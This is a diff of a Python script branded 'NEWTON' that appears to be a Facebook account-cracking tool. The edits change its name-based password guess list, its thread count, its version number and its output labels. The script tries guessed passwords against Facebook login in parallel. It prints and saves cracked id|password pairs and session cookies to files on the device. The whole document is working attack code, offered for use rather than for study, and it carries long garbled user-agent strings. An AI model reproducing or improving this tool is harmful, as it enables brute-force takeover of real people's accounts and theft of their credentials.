@@ -260,17 +260,17 @@ def ua():
 	ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CHP7800 Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.09.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.09.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1280, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
 	return ua
 def iAmMethod2Ua():
-    END = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.07.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.07.0.1 CHP7800 Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
-    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CPH3818 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=720, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.09.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=720, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.08.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
+    END = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CPH3818 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CPH3818 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
     return ua        
-    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.09.0.1 CPH3818 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CPH3818 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1 CHP7800 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1280, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CHP7800 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=720, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.013.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
     return ua
 name=input('\033[1;32m[✓] \033[1;32mINPUT NAME:')    
 logo=("""
 \033[1;37m   
 $$\   $$\ $$$$$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$\  $$\   $$\DEVELOPER:NEWTON
 $$$\  $$ |$$  _____|$$ | $\  $$ |\__$$  __|$$  __$$\ $$$\  $$ |FB: DI W AS
-$$$$\ $$ |$$ |      $$ |$$$\ $$ |   $$ |   $$ /  $$ |$$$$\ $$ |VERSION:2.0.2
+$$$$\ $$ |$$ |      $$ |$$$\ $$ |   $$ |   $$ /  $$ |$$$$\ $$ |VERSION:2.0.4
 $$ $$\$$ |$$$$$\    $$ $$ $$\$$ |   $$ |   $$ |  $$ |$$ $$\$$ |
 $$ \$$$$ |$$  __|   $$$$  _$$$$ |   $$ |   $$ |  $$ |$$ \$$$$ |
 $$ |\$$$ |$$ |      $$$  / \$$$ |   $$ |   $$ |  $$ |$$ |\$$$ |
@@ -369,37 +369,15 @@ def file():
                                         plist.append('first last')
                                         plist.append('firstlast')
                                         plist.append('first123')
-                                        plist.append('first1234')
                                         plist.append('first12345')             
                                         plist.append('first@123')
-                                        plist.append('first@1234')
                                         plist.append('first@12345')        
                                         plist.append('first123@')
                                         plist.append('@first123')
                                         plist.append('first123456789')        
                                         plist.append('firstlast123')       
                                         plist.append('firstlast@123')   
-                                        plist.append('last123')
-                                        plist.append('last@123') 
                                         plist.append('Nepal123')
-                                        plist.append('nepal@123')
-                                        plist.append('@first')
-                                        plist.append('@firstlast123')
-                                        plist.append('@first123')
-                                        plist.append('@first1234')
-                                        plist.append('@first12345')             
-                                        plist.append('@first111')
-                                        plist.append('first111')
-                                        plist.append('First111')
-                                        plist.append('qwertyuiop')
-                                        plist.append('Qwertyuiop')
-                                        plist.append('QWERTYUIOP')             
-                                        plist.append('first112233')
-                                        plist.append('First112233')
-                                        plist.append('first@112233')
-                                        plist.append('First@112233')
-                                        plist.append('@first112233')
-                                        plist.append('@First112233')
                                 else:
                                         try:
                                                 linex()
@@ -429,7 +407,7 @@ def file():
                                 else:
                                     pcookie.append('n')
                                 linex()
-                                with tred(max_workers=50) as crack_submit:
+                                with tred(max_workers=30) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
                                         print('\033[1;37m \x1b[38;5;208mTOTAL ACCOUNT : \033[1;32m'+total_ids)
@@ -743,7 +721,7 @@ def M1(ids,names,passlist):
                                                 break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;91m [HANFSOME-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;91m [NEWTON-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/NEWTON_CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
@@ -760,7 +738,7 @@ def M1(ids,names,passlist):
 def M2(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [NEWTONM2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [NEWTON-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -829,7 +807,7 @@ def M2(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
-                                        print('\r\r\033[1;32m [print("\033[1;32m NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                         print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                         open('/sdcard/NEWTON_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         Elite(ids,pas,cookie)
@@ -842,7 +820,7 @@ def M2(ids,names,passlist):
                                                 break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;91m [print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;91m [NEWTON-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/NEWTON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
